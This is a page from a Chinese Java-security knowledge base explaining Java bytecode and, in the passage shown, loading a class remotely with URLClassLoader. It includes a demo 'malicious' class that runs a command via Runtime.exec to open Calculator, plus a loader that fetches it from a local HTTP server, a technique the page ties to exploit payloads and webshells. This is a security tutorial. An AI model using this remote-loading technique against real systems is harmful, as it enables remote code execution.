<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/审计基础/Java加载字节码" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Java加载字节码 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/Java加载字节码"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Java加载字节码 | d4m1ts 知识库"><meta data-rh="true" name="description" content="什么是Java字节码"><meta data-rh="true" property="og:description" content="什么是Java字节码"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/Java加载字节码"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/Java加载字节码" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/审计基础/Java加载字节码" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"审计基础","item":"https://blog.gm7.org/docs/category/审计基础"},{"@type":"ListItem","position":3,"name":"Java加载字节码","item":"https://blog.gm7.org/docs/代码审计/Java安全/审计基础/Java加载字节码"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.07724ef0.js" defer="defer"></script>
<script src="/assets/js/main.9f1c0106.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="折叠侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/JVM类加载机制">JVM类加载机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/Java反射机制">Java反射机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/Java序列化与反序列化">Java 序列化和反序列化</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/RMI基础">RMI基础</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/JNDI注入">JNDI注入</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/IDEA断点调试">IDEA断点调试</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/审计基础/Java加载字节码">Java加载字节码</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/javassist字节码编程">javassist字节码编程</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/EL表达式">EL表达式</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/SpEL表达式">SpEL表达式</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/OGNL表达式">OGNL表达式</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/审计基础/IDEA调试JAR">IDEA调试JAR</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/其他">其他</a><button aria-label="展开侧边栏分类 &#x27;其他&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/审计基础"><span>审计基础</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Java加载字节码</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><p><img decoding="async" loading="lazy" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByb2xlPSJpbWciIGFyaWEtbGFiZWw9ImQ0bTF0czogMjAyMSI+PHRpdGxlPmQ0bTF0czogMjAyMTwvdGl0bGU+PGxpbmVhckdyYWRpZW50IGlkPSJzIiB4Mj0iMCIgeTI9IjEwMCUiPjxzdG9wIG9mZnNldD0iMCIgc3RvcC1jb2xvcj0iI2JiYiIgc3RvcC1vcGFjaXR5PSIuMSIvPjxzdG9wIG9mZnNldD0iMSIgc3RvcC1vcGFjaXR5PSIuMSIvPjwvbGluZWFyR3JhZGllbnQ+PGNsaXBQYXRoIGlkPSJyIj48cmVjdCB3aWR0aD0iMTA1IiBoZWlnaHQ9IjIwIiByeD0iMyIgZmlsbD0iI2ZmZiIvPjwvY2xpcFBhdGg+PGcgY2xpcC1wYXRoPSJ1cmwoI3IpIj48cmVjdCB3aWR0aD0iNjgiIGhlaWdodD0iMjAiIGZpbGw9IiNiZmJmYmYiLz48cmVjdCB4PSI2OCIgd2lkdGg9IjM3IiBoZWlnaHQ9IjIwIiBmaWxsPSIjZmY3NTFhIi8+PHJlY3Qgd2lkdGg9IjEwNSIgaGVpZ2h0PSIyMCIgZmlsbD0idXJsKCNzKSIvPjwvZz48ZyBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iVmVyZGFuYSxHZW5ldmEsRGVqYVZ1IFNhbnMsc2Fucy1zZXJpZiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgZm9udC1zaXplPSIxMTAiPjxpbWFnZSB4PSI1IiB5PSIzIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiIHhsaW5rOmhyZWY9ImRhdGE6aW1hZ2Uvc3ZnK3htbDtiYXNlNjQsUEhOMlp5Qm1hV3hzUFNJak0yTXpZek5rSWlCeWIyeGxQU0pwYldjaUlIWnBaWGRDYjNnOUlqQWdNQ0F5TkNBeU5DSWdlRzFzYm5NOUltaDBkSEE2THk5M2QzY3Vkek11YjNKbkx6SXdNREF2YzNabklqNDhkR2wwYkdVK1JYUm9aWEpsZFcwOEwzUnBkR3hsUGp4d1lYUm9JR1E5SWsweE1TNDVORFFnTVRjdU9UZE1OQzQxT0NBeE15NDJNaUF4TVM0NU5ETWdNalJzTnk0ek55MHhNQzR6T0MwM0xqTTNNaUEwTGpNMWFDNHdNRE42VFRFeUxqQTFOaUF3VERRdU5qa2dNVEl1TWpJemJEY3VNelkxSURRdU16VTBJRGN1TXpZMUxUUXVNelZNTVRJdU1EVTJJREI2SWk4K1BDOXpkbWMrIi8+PHRleHQgYXJpYS1oaWRkZW49InRydWUiIHg9IjQzNSIgeT0iMTUwIiBmaWxsPSIjY2NjIiBmaWxsLW9wYWNpdHk9Ii4zIiB0cmFuc2Zvcm09InNjYWxlKC4xKSIgdGV4dExlbmd0aD0iNDEwIj5kNG0xdHM8L3RleHQ+PHRleHQgeD0iNDM1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjMzMzIiB0ZXh0TGVuZ3RoPSI0MTAiPmQ0bTF0czwvdGV4dD48dGV4dCBhcmlhLWhpZGRlbj0idHJ1ZSIgeD0iODU1IiB5PSIxNTAiIGZpbGw9IiMwMTAxMDEiIGZpbGwtb3BhY2l0eT0iLjMiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMjE8L3RleHQ+PHRleHQgeD0iODU1IiB5PSIxNDAiIHRyYW5zZm9ybT0ic2NhbGUoLjEpIiBmaWxsPSIjZmZmIiB0ZXh0TGVuZ3RoPSIyNzAiPjIwMjE8L3RleHQ+PC9nPjwvc3ZnPg==" width="105" height="20" class="img_ev3q"></p>
<header><h1>简介</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="什么是java字节码">什么是Java字节码<a href="#什么是java字节码" class="hash-link" aria-label="什么是Java字节码的直接链接" title="什么是Java字节码的直接链接">​</a></h2>
<p>它是程序的一种低级表示，可以运行于Java虚拟机上。将程序抽象成字节码可以保证Java程序在各种设备上的运行</p>
<p>Java号称是一门“一次编译到处运行”的语言，从我们写的java文件到通过编译器编译成<strong>java字节码文件（<code>.class</code>文件）</strong>，这个过程是java编译过程；而我们的java虚拟机执行的就是字节码文件。<strong>不论该字节码文件来自何方，由哪种编译器编译，甚至是手写字节码文件，只要符合java虚拟机的规范，那么它就能够执行该字节码文件。</strong></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="java程序的运行">JAVA程序的运行<a href="#java程序的运行" class="hash-link" aria-label="JAVA程序的运行的直接链接" title="JAVA程序的运行的直接链接">​</a></h2>
<p>因为Java具有跨平台特性，为了实现这个特性，Java执行在一台虚拟机上，这台虚拟机就是JVM，Java通过JVM屏蔽了不同平台之间的差异，从而做到一次编译到处执行。</p>
<p>JVM位于Java编译器和OS平台之间，Java编译器只需面向JVM，生成JVM能理解的代码，这个代码即字节码，JVM再将字节码翻译成真实机器所能理解的二进制机器码。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="字节码如何产生">字节码如何产生<a href="#字节码如何产生" class="hash-link" aria-label="字节码如何产生的直接链接" title="字节码如何产生的直接链接">​</a></h2>
<p>我们编写的代码文件通常是以<code>.java</code>作为结尾的，可以直接通过<code>javac</code>命令将java文件编译为<code>.class</code>文件，这个<code>.class</code>文件就是字节码文件，也可以直接运行IDE，让其自动为我们编译</p>
<p><img decoding="async" loading="lazy" alt="image-20211027130138624" src="/assets/images/image-20211027130138624-2e1877b4b9baf97f16486bb6f3bcd622.png" width="608" height="412" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="如何看懂字节码">如何看懂字节码<a href="#如何看懂字节码" class="hash-link" aria-label="如何看懂字节码的直接链接" title="如何看懂字节码的直接链接">​</a></h2>
<p>可以参考文章：<a href="https://www.jianshu.com/p/fa53b4169df9" target="_blank" rel="noopener noreferrer">深入理解JVM-读懂java字节码</a></p>
<h1>加载字节码</h1>
<p>通常我们是编写好java代码然后ide帮我们自动编译成class字节码文件再加载到jvm中运行的，那如果我们想自己加载class文件，有哪些办法呢？</p>
<ul>
<li>后续利用到的演示恶意代码如下</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.io.IOException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Exp {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Exp() throws IOException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Runtime.getRuntime().exec(new String[]{&quot;open&quot;, &quot;-na&quot;, &quot;Calculator&quot;});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<ul>
<li>编译为字节码</li>
</ul>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">javac Exp.java</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="利用urlclassloader加载远程class文件">利用URLClassLoader加载远程class文件<a href="#利用urlclassloader加载远程class文件" class="hash-link" aria-label="利用URLClassLoader加载远程class文件的直接链接" title="利用URLClassLoader加载远程class文件的直接链接">​</a></h2>
<p>利用<code>ClassLoader</code>来加载字节码文件是最基础的方法，<code>URLClassLoader</code>继承自<code>ClassLoader</code>且重写了<code>findClass</code>函数，允许远程加载字节码，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用（当然，该方式只适应于目标出网的情况）。</p>
<p>正常情况下，Java会根据配置项 <code>sun.boot.class.path</code>和<code>java.class.path</code>中列举到的基础路径（这些路径是经过处理后的<code>java.net.URL</code>类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
<ol>
<li>
<p>URL未以斜杠/结尾，则认为是一个JAR文件，使用 <code>JarLoader</code> 来寻找类，即为在Jar包中寻找<code>.class</code>文件（jar文件中直接包含class文件，可以使用命令 <code>jar cvf Exp.jar Exp.class</code> 进行打包）。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.MalformedURLException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URL;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.net.URLClassLoader;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class loadClassFile {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(&quot;http://127.0.0.1:8000/Exp.jar&quot;)});</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 会加载 http://127.0.0.1:8000/Exp.jar中的Exp.class</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Class&lt;?&gt; exp = urlClassLoader.loadClass(&quot;Exp&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 触发构造函数，弹计算器</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        exp.newInstance();</span><br></span><span class="token-line" 